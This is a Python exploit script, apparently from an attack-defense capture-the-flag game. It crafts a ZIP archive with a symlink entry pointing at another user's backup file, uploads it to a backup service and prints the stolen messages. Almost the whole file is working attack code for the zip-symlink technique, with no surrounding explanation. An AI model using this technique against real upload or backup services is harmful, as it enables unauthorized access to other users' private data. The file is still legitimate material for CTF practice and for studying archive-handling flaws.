#!/usr/bin/env python3

import sys
import random
import string
import io
import json
import zipfile

from client import Client, User


SERVICE_PORT = 10050

USERNAME_LENGTH = 12
PASSWORD_LENGTH = 16


def randstr(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


def randuser() -> User:
    username = randstr(USERNAME_LENGTH)
    password = randstr(PASSWORD_LENGTH)
    return User(username, password)


def randuser_auth(client: Client) -> User:
    user = randuser()
    client.user = user
    client.register(exist_ok=True)
    client.auth()
    return user


def exploit(client: Client, flagid: str):
    assert flagid.startswith('backup:')
    user_id, backup_id = flagid[len('backup:'):].split('/')
    user_id = int(user_id)

    bio = io.BytesIO()
    with zipfile.ZipFile(bio, mode='w') as zf:
        # BUG: ZIP symlink vulnerability
        info = zipfile.ZipInfo('messages')
        info.create_system = 3
        info.external_attr = 0xA1ED0000
        zf.writestr(
            info, f'/app/storage/backups/{user_id}/{backup_id}/messages')
        zf.writestr('public_key', '')
        zf.writestr('balance', '')

    randuser_auth(client)

    backup_id = client.new_backup(bio.getvalue())
    backup = client.get_backup(backup_id)

    bio = io.BytesIO(backup)
    with zipfile.ZipFile(bio) as zf:
        msgs = json.loads(zf.read('messages'))
        for msg in msgs:
            print(msg['content'])


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <flag ID>', file=sys.stderr)
        exit(1)

    host, flagid = sys.argv[1:]

    client = Client()
    client.connect(host, SERVICE_PORT)

    exploit(client, flagid)


if __name__ == '__main__':
    main()
